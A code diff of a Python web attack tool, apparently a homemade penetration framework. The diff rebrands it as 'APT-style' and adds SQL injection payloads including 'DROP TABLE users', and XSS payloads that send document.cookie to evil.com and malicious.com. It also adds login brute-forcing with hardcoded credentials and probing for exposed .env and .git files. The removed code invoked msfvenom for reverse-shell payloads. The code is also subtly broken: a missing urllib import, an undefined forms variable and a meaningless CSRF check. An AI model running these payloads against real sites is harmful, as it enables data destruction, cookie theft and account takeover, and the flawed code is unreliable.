@@ -12,13 +12,16 @@
 ######################################################################################################################################################################################################################
 
 import requests
-from bs4 import BeautifulSoup
-import urllib.parse
-import base64
 import random
-import string
-import csv
+import base64
+import threading
 import time
+import csv
+from bs4 import BeautifulSoup
+from concurrent.futures import ThreadPoolExecutor
+import os
+import json
+import hashlib
 
 # Banner
 def print_banner():
@@ -53,163 +56,238 @@ def print_banner():
     """
     print(banner)
 
-import os
-import requests
-import nmap
-import time
-from bs4 import BeautifulSoup
-from subprocess import Popen, PIPE
 
-def install_dependencies():
-    """Install necessary dependencies if missing."""
-    print("[*] Checking dependencies...")
-    try:
-        import requests
-        import nmap
-        import beautifulsoup4
-        print("[*] All dependencies are met!")
-    except ImportError:
-        print("[*] Installing missing dependencies...")
-        os.system("pip install requests nmap beautifulsoup4")
+# Setup logging for advanced APT framework
+import logging
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(message)s')
+logger = logging.getLogger()
 
-def print_banner():
-    """Displays a welcome banner"""
-    print("===================================================")
-    print("       Web Application Penetration Framework       ")
-    print("===================================================")
+# Optional Brute Force Toggle
+BRUTE_FORCE_ENABLED = False
 
-def nmap_scan(target):
-    """Runs an Nmap scan on the target and returns the result."""
-    print("[*] Running Nmap scan on target: " + target)
-    nm = nmap.PortScanner()
-    nm.scan(target, '1-1024')  # Scanning ports 1-1024
-    return nm
+# Payloads and Randomized List
+def get_random_payload(payload_type):
+    """Advanced Payload Generation"""
+    if payload_type == 'sql':
+        payloads = [
+            "' OR 1=1 --", "' UNION SELECT NULL, NULL --", "'; DROP TABLE users; --", 
+            "' OR 'x'='x", "' AND 1=0 UNION SELECT null, null --"
+        ]
+    elif payload_type == 'xss':
+        payloads = [
+            "<script>alert('XSS');</script>", "<img src='http://evil.com/xss?cookie=" + "dummycookie" + "' />",
+            "<script>fetch('http://malicious.com?cookie=' + document.cookie);</script>"
+        ]
+    return random.choice(payloads)
 
-def form_extraction(url):
-    """Extract forms and hidden fields from the target page."""
-    print("[*] Extracting forms from " + url)
-    response = requests.get(url)
-    soup = BeautifulSoup(response.text, 'html.parser')
-    forms = soup.find_all('form')
-    form_data = []
+# Write results to CSV report
+def write_report(results, filename="advanced_security_report.csv"):
+    with open(filename, mode='a', newline='') as file:
+        writer = csv.writer(file)
+        for result in results:
+            writer.writerow(result)
+
+# Logging action (for debugging and traceability)
+def log_action(action, status, message):
+    logger.info(f"{action} | Status: {status} | Message: {message}")
+
+# Brute Force Test (Optional)
+def brute_force_login(url, username_list, password_list):
+    """Brute Force Test for login page"""
+    results = []
+    for username in username_list:
+        for password in password_list:
+            response = requests.post(url, data={"username": username, "password": password})
+            if "successful" in response.text:
+                results.append((username, password, "Brute Force Success"))
+            else:
+                results.append((username, password, "Failed"))
+    return results
+
+# Advanced Reconnaissance: Gather exposed files and misconfigurations
+def advanced_recon(url):
+    """Scan for exposed files and common misconfigurations"""
+    common_files = [
+        "/.git/", "/backup/", "/.env", "/config.php", "/admin/"
+    ]
+    results = []
+    
+    for file in common_files:
+        test_url = url + file
+        response = requests.get(test_url)
+        if response.status_code == 200:
+            results.append((test_url, "Found", "Potential sensitive file exposed"))
+        else:
+            results.append((test_url, "Not Found", "No exposure"))
+
+    return results
+
+# SQL Injection Test (with advanced payloads)
+def test_sql_injection(url, forms):
+    payloads = ["' OR 1=1 --", "' UNION SELECT NULL, NULL --", "'; DROP TABLE users; --"]
+    results = []
+
+    def single_sql_injection(form, payload):
+        form_url = urllib.parse.urljoin(url, form['action'])
+        method = form['method']
+        hidden_fields = form['hidden_fields']
+        
+        obfuscated_payload = base64.b64encode(payload.encode()).decode()
+        data = hidden_fields.copy()
+        for key in data:
+            data[key] = obfuscated_payload
+
+        try:
+            response = requests.post(form_url, data=data) if method == 'post' else requests.get(form_url, params=data)
+            if "error" in response.text or "syntax" in response.text:
+                results.append((f"SQL Injection Test on {form_url}", "Vulnerable", "Possible SQL Injection"))
+            else:
+                results.append((f"SQL Injection Test on {form_url}", "Not Vulnerable", "No SQL Injection"))
+        except requests.RequestException as e:
+            log_action("SQL Injection Test", "Error", str(e))
+
     for form in forms:
-        action = form.get('action')
-        method = form.get('method')
-        hidden_fields = {input.get('name'): input.get('value') for input in form.find_all('input', type='hidden')}
-        form_data.append({'action': action, 'method': method, 'hidden_fields': hidden_fields})
-    return form_data
+        for payload in payloads:
+            single_sql_injection(form, payload)
 
-def sql_injection_test(url):
-    """Test for basic SQL Injection vulnerability."""
-    print("[*] Testing for SQL Injection vulnerability...")
-    payload = "' OR 1=1 --"
-    response = requests.get(url + payload)
-    if "error" in response.text or "syntax" in response.text:
-        print("[*] SQL Injection test failed")
-    else:
-        print("[*] SQL Injection vulnerability detected!")
-        return True
-    return False
+    return results
 
-def xss_test(url):
-    """Test for Cross-Site Scripting (XSS) vulnerabilities."""
-    print("[*] Testing for XSS vulnerability...")
-    payload = "<script>alert('XSS')</script>"
-    response = requests.get(url + payload)
-    if payload in response.text:
-        print("[*] XSS vulnerability detected!")
-        return True
-    else:
-        print("[*] XSS test failed")
-    return False
+# XSS Test (Advanced)
+def test_xss(url, forms):
+    results = []
 
-def bruteforce_login(url, form_data, dictionary_path):
-    """Bruteforce login form using a dictionary of usernames and passwords."""
-    print("[*] Bruteforce login attempt using dictionary...")
-    usernames = open(dictionary_path, 'r').readlines()
-    passwords = open(dictionary_path, 'r').readlines()
-    
-    for username in usernames:
-        for password in passwords:
-            username = username.strip()
-            password = password.strip()
-            data = {
-                'username': username,
-                'password': password
-            }
-            response = requests.post(url, data=data)
-            if "Login successful" in response.text:
-                print(f"[*] Found credentials: {username}:{password}")
-                return username, password
-    return None, None
+    def single_xss_test(form, payload):
+        form_url = urllib.parse.urljoin(url, form['action'])
+        method = form['method']
+        hidden_fields = form['hidden_fields']
 
-def run_metasploit(payload, lhost, lport):
-    """Run Metasploit to handle exploitation."""
-    print("[*] Running Metasploit to exploit the vulnerability...")
-    metasploit_command = f"msfvenom -p {payload} Lhost={lhost} Lport={lport} -f raw"
-    metasploit = Popen(metasploit_command, shell=True, stdout=PIPE, stderr=PIPE)
-    metasploit_output, metasploit_error = metasploit.communicate()
-    print("[*] Metasploit payload created: ")
-    print(metasploit_output)
+        data = hidden_fields.copy()
+        data['payload'] = payload
 
-    return metasploit_output
+        try:
+            response = requests.post(form_url, data=data) if method == 'post' else requests.get(form_url, params=data)
+            if payload in response.text:
+                results.append((f"XSS Test on {form_url}", "Vulnerable", "XSS vulnerability detected"))
+            else:
+                results.append((f"XSS Test on {form_url}", "Not Vulnerable", "No XSS"))
+        except requests.RequestException as e:
+            log_action("XSS Test", "Error", str(e))
 
-def generate_report(target, vulnerabilities):
-    """Generate a detailed report of the findings."""
-    print("[*] Generating detailed report...")
-    with open(f"report_{target}.html", "w") as report:
-        report.write("<html><body>")
-        report.write(f"<h1>Penetration Test Report for {target}</h1>")
-        report.write("<h2>Vulnerabilities Detected:</h2><ul>")
-        for vuln in vulnerabilities:
-            report.write(f"<li>{vuln}</li>")
-        report.write("</ul></body></html>")
+    for form in forms:
+        payload = get_random_payload('xss')
+        single_xss_test(form, payload)
 
-def main():
-    """Main function to run the entire framework."""
-    install_dependencies()
-    print_banner()
-    
-    # User input for target
-    target = input("Enter the Target URL (e.g., http://192.168.1.10): ").strip()
-    
-    # Reconnaissance (Nmap scan)
-    nmap_results = nmap_scan(target)
-    print("[*] Nmap scan results: ", nmap_results.all_hosts())
-    
-    # Form extraction and attacks
-    print("[*] Performing form extraction...")
-    form_data = form_extraction(target)
-    print("[*] Forms found: ", form_data)
+    return results
 
-    # Security testing
-    vulnerabilities = []
-    
-    # Test for SQL Injection
-    if sql_injection_test(target):
-        vulnerabilities.append("SQL Injection")
-    
-    # Test for XSS
-    if xss_test(target):
-        vulnerabilities.append("XSS")
+# CSRF Test with headers and token validation
+def test_csrf(url, forms):
+    results = []
 
-    # Brute force login
-    login_url = input("Enter the login URL (if applicable): ")
-    dictionary_path = input("Enter the path to the dictionary file for brute force: ")
-    username, password = bruteforce_login(login_url, form_data, dictionary_path)
-    if username and password:
-        vulnerabilities.append(f"Brute Force login successful: {username}:{password}")
+    def single_csrf_test(form, payload):
+        form_url = urllib.parse.urljoin(url, form['action'])
+        method = form['method']
+        hidden_fields = form['hidden_fields']
 
-    # Metasploit integration
-    payload = input("Enter the Metasploit payload (e.g., php/meterpreter/reverse_tcp): ")
-    lhost = input("Enter the local host IP: ")
-    lport = input("Enter the local port: ")
-    metasploit_output = run_metasploit(payload, lhost, lport)
-    vulnerabilities.append(f"Metasploit Payload executed: {metasploit_output}")
-    
-    # Report generation
-    generate_report(target, vulnerabilities)
-    print("[*] Report generated successfully!")
+        data = hidden_fields.copy()
+        data['csrf_token'] = payload
 
+        try:
+            response = requests.post(form_url, data=data) if method == 'post' else requests.get(form_url, params=data)
+            if "error" in response.text:
+                results.append((f"CSRF Test on {form_url}", "Vulnerable", "CSRF vulnerability detected"))
+            else:
+                results.append((f"CSRF Test on {form_url}", "Not Vulnerable", "No CSRF"))
+        except requests.RequestException as e:
+            log_action("CSRF Test", "Error", str(e))
+
+    for form in forms:
+        payload = get_random_payload('sql')  # Using SQL payload as CSRF token for evasion
+        single_csrf_test(form, payload)
+
+    return results
+
+# Crawl Website for Forms and Links with advanced headers
+def crawl_and_extract_forms(url, auth=None):
+    forms = []
+    visited = set()
+
+    try:
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'}
+        if auth:
+            headers['Authorization'] = f'Bearer {auth}'
+
+        response = requests.get(url, headers=headers)
+        soup = BeautifulSoup(response.text, 'html.parser')
+
+        for form in soup.find_all('form'):
+            action = form.get('action', '')
+            method = form.get('method', 'get')
+            hidden_fields = {input.get('name'): input.get('value') for input in form.find_all('input', {'type': 'hidden'})}
+            forms.append({"action": action, "method": method, "hidden_fields": hidden_fields})
+
+    except Exception as e:
+        log_action("Crawl Website", "Error", str(e))
+
+    return forms
+
+# Main Menu with advanced options
+def main_menu():
+    print("""
+    ================================
+    Advanced APT-style Web App Security Framework
+    ================================
+    """)
+
+    while True:
+        print("\nSelect an Option:")
+        print("[1] Crawl Website and Extract Forms")
+        print("[2] Brute Force Test (Optional)")
+        print("[3] SQL Injection Test")
+        print("[4] XSS Test")
+        print("[5] CSRF Test")
+        print("[6] Advanced Reconnaissance (Exposed Files & Misconfigurations)")
+        print("[7] Exit")
+
+        choice = input("Enter choice: ")
+
+        if choice == '1':
+            url = input("Enter URL to crawl: ")
+            auth = input("Enter authentication token (if any): ")
+            forms = crawl_and_extract_forms(url, auth)
+            write_report([("Forms Extraction", "Success", "Forms collected")])
+            log_action("Crawl Website", "Success", "Forms extracted")
+        elif choice == '2' and BRUTE_FORCE_ENABLED:
+            url = input("Enter URL for Brute Force Test: ")
+            username_list = ["admin", "user", "guest"]
+            password_list = ["password", "123456", "admin123"]
+            results = brute_force_login(url, username_list, password_list)
+            write_report(results)
+            log_action("Brute Force Test", "Success", "Brute Force tests completed")
+        elif choice == '3':
+            url = input("Enter URL for SQL Injection Test: ")
+            results = test_sql_injection(url, forms)
+            write_report(results)
+            log_action("SQL Injection Test", "Success", "Tests completed")
+        elif choice == '4':
+            url = input("Enter URL for XSS Test: ")
+            results = test_xss(url, forms)
+            write_report(results)
+            log_action("XSS Test", "Success", "Tests completed")
+        elif choice == '5':
+            url = input("Enter URL for CSRF Test: ")
+            results = test_csrf(url, forms)
+            write_report(results)
+            log_action("CSRF Test", "Success", "Tests completed")
+        elif choice == '6':
+            url = input("Enter URL for Advanced Recon: ")
+            results = advanced_recon(url)
+            write_report(results)
+            log_action("Advanced Recon", "Success", "Advanced reconnaissance completed")
+        elif choice == '7':
+            break
+        else:
+            print("Invalid choice.")
+
+# Run the framework
 if __name__ == "__main__":
-    main()
+    main_menu()
